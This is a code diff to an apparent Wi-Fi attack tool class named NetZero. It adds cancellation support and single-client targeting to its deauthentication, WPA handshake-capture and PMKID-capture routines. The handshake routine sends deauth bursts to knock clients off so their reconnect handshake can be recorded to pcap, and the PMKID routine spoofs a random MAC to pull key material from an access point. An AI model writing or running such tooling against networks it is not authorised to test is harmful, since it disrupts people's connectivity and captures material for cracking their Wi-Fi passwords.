@@ -183,7 +183,7 @@ class NetZero:
         self._launch("deauth", self._deauth, (bssid, client, channel, bursts))
 
     def _deauth(self, bssid, client, channel, bursts):
-        attacks.send_deauth(self.iface, bssid, client, channel, bursts=bursts, log=self.log)
+        attacks.send_deauth(self.iface, bssid, client, channel, bursts=bursts, log=self.log, cancel=self._stop)
         self.status("Deauth burst complete.")
 
     # --- handshake ------------------------------------------------------------
@@ -193,9 +193,11 @@ class NetZero:
     def _handshake(self, bssid, client, channel, ssid):
         outfile = str(CAPTURE_DIR / f"handshake_{_safe(ssid)}_{int(time.time())}.pcap")
         set_channel(channel, self.iface)
-        with attacks.capture_handshakes(self.iface, bssid, outfile, log=self.log) as (hs, wait):
-            # nudge clients to reconnect so we catch the 4-way handshake
-            attacks.send_deauth(self.iface, bssid, client, channel, bursts=2, log=self.log)
+        if client:
+            self.log(f"Targeting client {client} on {ssid}")
+        with attacks.capture_handshakes(self.iface, bssid, outfile, log=self.log, cancel=self._stop) as (hs, wait):
+            # nudge the target client (or all clients) to reconnect for the 4-way handshake
+            attacks.send_deauth(self.iface, bssid, client, channel, bursts=2, log=self.log, cancel=self._stop)
             wait()
         ok = any((m["M1"] and m["M2"]) or (m["M2"] and m["M3"]) for m in hs.values())
         self._emit({"type": "capture", "kind": "handshake", "ok": ok,
@@ -212,7 +214,7 @@ class NetZero:
         fake_mac = str(RandMAC())
         outfile = str(CAPTURE_DIR / f"pmkid_{_safe(ssid)}_{int(time.time())}.pcap")
         set_channel(channel, self.iface)
-        with attacks.capture_pmkid(self.iface, bssid, fake_mac, outfile, log=self.log) as (st, wait):
+        with attacks.capture_pmkid(self.iface, bssid, fake_mac, outfile, log=self.log, cancel=self._stop) as (st, wait):
             attacks.trigger_pmkid(self.iface, bssid, fake_mac, ssid, channel, log=self.log)
             wait()
         self._emit({"type": "capture", "kind": "pmkid", "ok": st["pmkid"],
